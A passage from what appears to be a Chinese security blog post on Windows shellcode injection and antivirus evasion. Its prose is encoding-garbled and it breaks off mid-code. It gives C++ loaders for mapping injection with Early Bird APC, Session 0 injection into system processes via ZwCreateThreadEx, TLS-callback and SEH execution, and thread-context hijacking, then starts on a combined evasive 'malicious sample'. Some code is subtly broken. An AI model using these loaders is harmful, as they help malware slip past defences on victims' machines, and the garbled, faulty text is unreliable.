å°„åˆ°æŒ‡å®šè¿›ç¨‹ä¸­çš„è™šæ‹Ÿå†…å­˜ä¸­å»ï¼Œè¾¾åˆ° shellcode æ³¨å…¥çš„æ•ˆæœã€‚<br />\næ³¨å…¥æµç¨‹ï¼š<br />\n1ã€åˆ›å»º Mapping å¥æŸ„<br />\n 2ã€å°† shellcode å¤åˆ¶åˆ°è¯¥ç‰©ç†å†…å­˜åœ°å€ä¸­å»<br />\n 3ã€å°†è¯¥æ®µç‰©ç†å†…å­˜æ˜ å°„åˆ°è™šæ‹Ÿå†…å­˜ä¸­<br />\n 4ã€åˆ©ç”¨ä»»æ„æ–¹æ³•æ‰§è¡Œåˆ°è¯¥åœ°å€çš„ shellcode</p>\n<p><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> comment (lib, <span class=\"string\">&quot;OneCore.lib&quot;</span>)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> shellcode[] = &#123;<span class=\"number\">0x12</span>&#125;;  <span class=\"comment\">//shellcode</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">     STARTUPINFO si = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">     PROCESS_INFORMATION pi = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">     si.cb = <span class=\"built_in\">sizeof</span>(STARTUPINFO);</span><br><span class=\"line\">     </span><br><span class=\"line\">     HANDLE hMapping = <span class=\"built_in\">CreateFileMapping</span>(INVALID_HANDLE_VALUE, <span class=\"literal\">NULL</span>, PAGE_EXECUTE_READWRITE, <span class=\"number\">0</span>, <span class=\"built_in\">sizeof</span>(shellcode), <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">     LPVOID lpMapAddress = <span class=\"built_in\">MapViewOfFile</span>(hMapping, FILE_MAP_WRITE, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"built_in\">sizeof</span>(shellcode));</span><br><span class=\"line\">     <span class=\"built_in\">memcpy</span>((PVOID)lpMapAddress, shellcode, <span class=\"built_in\">sizeof</span>(shellcode));</span><br><span class=\"line\">     <span class=\"built_in\">CreateProcessA</span>(<span class=\"string\">&quot;C:\\\\Windows\\\\System32\\\\notepad.exe&quot;</span>, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, (LPSTARTUPINFOA)&amp;si, &amp;pi);</span><br><span class=\"line\">     LPVOID lpMapAddressRemote = <span class=\"built_in\">MapViewOfFile2</span>(hMapping, pi.hProcess, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, PAGE_EXECUTE_READ);</span><br><span class=\"line\">     </span><br><span class=\"line\">     <span class=\"built_in\">QueueUserAPC</span>((PAPCFUNC)lpMapAddressRemote, pi.hThread, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">     <span class=\"built_in\">ResumeThread</span>(pi.hThread);</span><br><span class=\"line\">     <span class=\"built_in\">CloseHandle</span>(pi.hThread);</span><br><span class=\"line\">     <span class=\"built_in\">CloseHandle</span>(hMapping);</span><br><span class=\"line\">     <span class=\"built_in\">UnmapViewOfFile</span>(lpMapAddress);</span><br><span class=\"line\">     <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"comment\">//Mapping Injection + Early Bird</span></span><br></pre></td></tr></table></figure><br />\n å¯ä»¥å’Œå…¶ä»–æ‰‹æ®µç»„åˆï¼Œæ¯”å¦‚ Early Bird æ¥è¾¾åˆ°å¼ºè§„é¿çš„æ•ˆæœ</p>\n<p><em><strong>Bypass Session 0 Injection (ç³»ç»Ÿè¿›ç¨‹æ³¨å…¥ç»•è¿‡)</strong></em><br />\n æ— æ³•ç›´æ¥å‘ç³»ç»Ÿè¿›ç¨‹å†…æ³¨å…¥ shellcode æˆ–è€… dllï¼ŒåŸå› æ˜¯ R3 çš„ CreateRemoteThread åœ¨ R0 ä¸­çš„å‡½æ•°åŸå‹ ZwCreateThreadEx åœ¨å†…éƒ¨è°ƒç”¨æ—¶ä¼šå°†ç¬¬ä¸ƒä¸ªå‚æ•°è®¾ä¸º 1 å¯¼è‡´ä¼šä½¿æ–°åˆ›å»ºçš„çº¿ç¨‹å¤„äºæŒ‚èµ·çŠ¶æ€ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æ¶æ„ shellcode æ— æ³•è¢«æ‰§è¡Œï¼Œåªéœ€è¦å°†ç¬¬ä¸ƒä¸ªå‚æ•°ç½® 0 å³å¯ç»•è¿‡ã€‚<br />\næ³¨å…¥æµç¨‹ï¼š<br />\n1ã€åˆ©ç”¨å‡½æ•°åŸå‹è‡ªå®šä¹‰ ZwCreateThreadEx å‡½æ•°<br />\n 2ã€é€šè¿‡ç³»ç»Ÿè·å– ntdll.dll å¹¶åŠ è½½ ZwCreateThreadEx å‡½æ•°<br />\n 3ã€ç”³è¯·ä¸€å—å†…å­˜ç©ºé—´å¹¶å°† shellcode å†™å…¥<br />\n 4ã€åˆ©ç”¨ ZwCreateThreadEx å°† shellcode æ³¨å…¥åˆ°ç³»ç»Ÿè¿›ç¨‹ä¸­ï¼Œå°†ç¬¬ä¸ƒä¸ªå‚æ•°ç½® 0</p>\n<p><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> _WIN64</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">typedef</span> <span class=\"title\">DWORD</span><span class=\"params\">(WINAPI* typedef_ZwCreateThreadEx)</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    PHANDLE ThreadHandle,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    ACCESS_MASK DesiredAccess,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    LPVOID ObjectAttributes,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    HANDLE ProcessHandle,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    LPVOID lpParameter,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    ULONG CreateThreadFlags,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    SIZE_T ZeroBits,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    SIZE_T StackSize,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    SIZE_T MaximumStackSize,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    LPVOID pUnkown)</span></span>;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">typedef</span> <span class=\"title\">DWORD</span><span class=\"params\">(WINAPI* typedef_ZwCreateThreadEx)</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    PHANDLE ThreadHandle,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    ACCESS_MASK DesiredAccess,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    LPVOID ObjectAttributes,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    HANDLE ProcessHandle,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    LPVOID lpParameter,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    BOOL CreateSuspended,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    DWORD dwStackSize,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    DWORD dw1,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    DWORD dw2,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    LPVOID pUnkown)</span></span>;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span> </span>&#123;</span><br><span class=\"line\">     <span class=\"comment\">//char DllPath[] = &quot;C:\\\\Users\\\\Black Sheep\\\\source\\\\repos\\\\sesion0\\\\x64\\\\Debug\\\\TestDll.dll&quot;;</span></span><br><span class=\"line\">      <span class=\"type\">char</span> shellcode[] = &#123;<span class=\"number\">0x12</span>&#125;   <span class=\"comment\">//shellcode</span></span><br><span class=\"line\">     HANDLE hRemoteThread;</span><br><span class=\"line\">    HANDLE hNtModule = <span class=\"built_in\">GetModuleHandleA</span>(<span class=\"string\">&quot;ntdll.dll&quot;</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">    typedef_ZwCreateThreadEx ZwCreateThreadEx = <span class=\"built_in\">GetProcAddress</span>(hNtModule, <span class=\"string\">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class=\"line\">    HANDLE hProcess = <span class=\"built_in\">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, <span class=\"number\">1516</span>(ç³»ç»Ÿè¿›ç¨‹pid));</span><br><span class=\"line\">    LPVOID lpBaseeAddresss = (LPVOID)<span class=\"built_in\">VirtualAllocEx</span>(pi.hProcess, <span class=\"literal\">NULL</span>, <span class=\"number\">0X1000</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">     <span class=\"built_in\">WriteProcessMemory</span>(hProcess, lpBaseAddress, shellcode, <span class=\"built_in\">sizeof</span>(shellcode), <span class=\"number\">0</span>);</span><br><span class=\"line\">      <span class=\"built_in\">ZwCreateThreadEx</span>(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class=\"literal\">NULL</span>, hProcess, (LPTHREAD_START_ROUTINE)lpBaseAddress, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">   </span><br><span class=\"line\">       <span class=\"built_in\">CloseHandle</span>(hRemoteThread);</span><br><span class=\"line\">        <span class=\"built_in\">CloseHandle</span>(hProcess);</span><br><span class=\"line\">          <span class=\"built_in\">FreeLibrary</span>(hNtModule);</span><br><span class=\"line\">           <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><em><strong>TLS Code Execute (TLS ä»£ç æ‰§è¡Œ)</strong></em><br />\n çº¿ç¨‹å±€éƒ¨å­˜å‚¨ï¼ˆThread Local Storageï¼ŒTLSï¼‰ç”¨æ¥å°†æ•°æ®ä¸ä¸€ä¸ªæ­£åœ¨æ‰§è¡Œçš„æŒ‡å®šçº¿ç¨‹å…³è”èµ·æ¥ï¼Œå…¶æä¾›äº†å›è°ƒå‡½æ•°å› æ­¤å¯ä»¥åˆ©ç”¨è¯¥å‡½æ•°è¾¾åˆ°æ‰§è¡Œ shellcode çš„æ•ˆæœï¼Œä¸»è¦ç¼–å†™çš„æ˜¯ Reason å…¶è§„å®šå’Œ dll è°ƒç”¨æ—¶ä¸€æ ·<strong> DLL_PROCESS_ATTACH</strong></p>\n<p><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> comment(linker, <span class=\"string\">&quot;/section:.data,RWE&quot;</span>) </span></span><br><span class=\"line\"><span class=\"type\">char</span> shellcode[] = &#123;<span class=\"number\">0x12</span>&#125;  <span class=\"comment\">//shellcode</span></span><br><span class=\"line\"></span><br><span class=\"line\">VOID NTAPI <span class=\"built_in\">TlsCallBack</span>(PVOID DllHandle, DWORD dwReason, PVOID Reserved)</span><br><span class=\"line\"><span class=\"comment\">//DllHandleæ¨¡å—å¥æŸ„ã€Reasonè°ƒç”¨åŸå› ã€ ReservedåŠ è½½æ–¹å¼ï¼ˆæ˜¾å¼/éšå¼ï¼‰</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (dwReason == DLL_PROCESS_ATTACH)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">//å†™æ‰§è¡Œå‡½æ•°ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨å…¶ä»–æ‰‹æ®µè¿›è¡Œshellcodeæ³¨å…¥</span></span><br><span class=\"line\">        ((<span class=\"built_in\">void</span>(WINAPI*)(<span class=\"type\">void</span>)) &amp; shellcode)();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//ä½¿ç”¨TLSéœ€è¦åœ¨ç¨‹åºä¸­æ–°å»ºä¸€ä¸ª.tlsæ®µä¸“é—¨å­˜æ”¾TLSæ•°æ®ï¼Œç”³æ˜ä½¿ç”¨</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> comment (linker, <span class=\"string\">&quot;/INCLUDE:__tls_used&quot;</span>)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> comment (linker, <span class=\"string\">&quot;/INCLUDE:__tls_callback&quot;</span>)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> data_seg (<span class=\"string\">&quot;.CRT$XLB&quot;</span>)</span></span><br><span class=\"line\"><span class=\"comment\">//.CRTè¡¨æ˜æ˜¯ä½¿ç”¨C RunTimeæœºåˆ¶ï¼Œ$åé¢çš„XLBä¸­ï¼šXè¡¨ç¤ºéšæœºçš„æ ‡è¯†</span></span><br><span class=\"line\"><span class=\"comment\">//Lè¡¨ç¤ºæ˜¯TLS callback sectionï¼ŒBå¯ä»¥è¢«æ¢æˆBåˆ°Yä¹‹é—´çš„ä»»æ„ä¸€ä¸ªå­—æ¯ï¼Œ</span></span><br><span class=\"line\"><span class=\"comment\">//ä½†æ˜¯ä¸èƒ½ä½¿ç”¨â€œ.CRT$XLAâ€å’Œâ€œ.CRT$XLZâ€ï¼Œå› ä¸ºâ€œ.CRT$XLAâ€å’Œâ€œ.CRT$XLZâ€æ˜¯ç”¨äºtlssup.objçš„ã€‚</span></span><br><span class=\"line\">EXTERN_C PIMAGE_TLS_CALLBACK _tls_callback = TlsCallBack;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> data_seg ()</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br />\n åªæ˜¯ä¸€ç§æ‰§è¡Œæ‰‹æ®µï¼Œä¾ç„¶å¯ä»¥é…åˆå…¶ä»–æ‰‹æ®µç»„åˆã€‚</p>\n<p><em><strong>SEH Code Execute (SEH å¼‚å¸¸å¤„ç†ä»£ç æ‰§è¡Œ)</strong></em><br />\n SEH (Structured Exception Handling) ç»“æ„åŒ–å¼‚å¸¸å¤„ç†ï¼Œæ˜¯ windows æ“ä½œç³»ç»Ÿé»˜è®¤çš„é”™è¯¯å¤„ç†æœºåˆ¶ï¼Œé€šè¿‡ä¸»åŠ¨æŠ›å‡ºå¼‚å¸¸ç„¶åå°†æ¶æ„ä»£ç æ’å…¥å³å¯è§¦å‘ï¼Œå¯ç”¨äºåè°ƒè¯•ã€‚</p>\n<p><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> comment(linker, <span class=\"string\">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> shellcode[] = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> a = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> b = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">ExceptFilter</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    b = <span class=\"number\">1</span>;</span><br><span class=\"line\">    ((<span class=\"built_in\">void</span>(*NTAPI)(<span class=\"type\">void</span>)) &amp; shellcode)();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> EXCEPTION_CONTINUE_EXECUTION;<span class=\"comment\">//è¿”å›å‡ºé”™ä½ç½®é‡æ–°æ‰§è¡Œ</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    _try</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> c = a / b;  <span class=\"comment\">//åªè¦èƒ½è§¦å‘å¼‚å¸¸å³å¯</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    _except(<span class=\"built_in\">ExceptFilter</span>()) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br />\n éœ€è¦ä¸»åŠ¨è§¦å‘å¼‚å¸¸ï¼Œå½“ç„¶å¯ä»¥å¡«å……å¤§é‡ä»£ç å°†è§¦å‘å¼‚å¸¸çš„ä»£ç å†™çš„å¾ˆéšè”½ï¼Œè¿˜å¯ä»¥åšåˆ°åè°ƒè¯•çš„æ•ˆæœï¼Œä¹Ÿéœ€è¦é…åˆå…¶ä»–æ‰‹æ®µé£Ÿç”¨ã€‚</p>\n<p><em><strong>SetContext Hijack Thread (çº¿ç¨‹ä¸Šä¸‹æ–‡ç¯å¢ƒåŠ«æŒ)</strong></em><br />\n ç®€å•ç†è§£å°±æ˜¯åŠ«æŒçº¿ç¨‹çš„ä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œç„¶åå¼ºè¡Œå°† eip/rip æŒ‡å‘ shellcode å¹¶æ‰§è¡Œã€‚<br />\nåŠ«æŒæµç¨‹ï¼š<br />\n1ã€åˆ›å»ºä¸€ä¸ªæŒ‚èµ·çš„åˆæ³•è¿›ç¨‹<br />\n 2ã€å°†æ¶æ„ shellcode å†™å…¥è¯¥è¿›ç¨‹<br />\n 3ã€å°† eip/rip æŒ‡å‘è¯¥åœ°å€<br />\n 4ã€æ¢å¤çº¿ç¨‹</p>\n<p><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> shellcode[] = &#123;<span class=\"number\">0x12</span>&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    STARTUPINFOA si = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">    si.cb = <span class=\"built_in\">sizeof</span>(si);</span><br><span class=\"line\"></span><br><span class=\"line\">    PROCESS_INFORMATION pi = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    </span><br><span class=\"line\">     <span class=\"built_in\">CreateProcessA</span>(<span class=\"literal\">NULL</span>, (LPSTR)<span class=\"string\">&quot;notepad&quot;</span>, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, FALSE, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, &amp;si, &amp;pi);</span><br><span class=\"line\">     <span class=\"built_in\">SuspendThread</span>(pi.hThread);</span><br><span class=\"line\">     LPVOID lpBuffer = <span class=\"built_in\">VirtualAllocEx</span>(pi.hProcess, <span class=\"literal\">NULL</span>, <span class=\"built_in\">sizeof</span>(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">     <span class=\"built_in\">WriteProcessMemory</span>(pi.hProcess, lpBuffer, shellcode, <span class=\"built_in\">sizeof</span>(shellcode), <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">     </span><br><span class=\"line\">     CONTEXT ctx = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">     ctx.ContextFlags = CONTEXT_ALL;</span><br><span class=\"line\">     <span class=\"built_in\">GetThreadContext</span>(pi.hThread, &amp;ctx);</span><br><span class=\"line\">     ctx.Rip = (DWORD64)lpBuffer;</span><br><span class=\"line\">     <span class=\"built_in\">SetThreadContext</span>(pi.hThread, &amp;ctx);</span><br><span class=\"line\">     <span class=\"built_in\">ResumeThread</span>(pi.hThread);</span><br><span class=\"line\">     <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"æœ¬åœ°æµ‹è¯•æ•ˆæœå’Œå…¶ä»–æ‰‹æ³•æ¼”ç¤º\"><a class=\"anchor\" href=\"#æœ¬åœ°æµ‹è¯•æ•ˆæœå’Œå…¶ä»–æ‰‹æ³•æ¼”ç¤º\">#</a> æœ¬åœ°æµ‹è¯•æ•ˆæœå’Œå…¶ä»–æ‰‹æ³•æ¼”ç¤º</h4>\n<p>æœ¬æ¬¡ç¼–å†™çš„æ¶æ„æ ·æœ¬æ‰‹æ³•ç»„åˆä¸ºï¼šsgn + Early Bird + RW/RX/NOA è½¬æ¢ + è‡ªå†™ Win32API + junkCode å¡«å…… + Sleep (15000)(å¾ªç¯çœŸç¡çœ ) è§„é¿ä¸»åŠ¨å†…å­˜æ‰«æ<br />\nä¸»è¦ä»£ç ï¼š<br />\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span 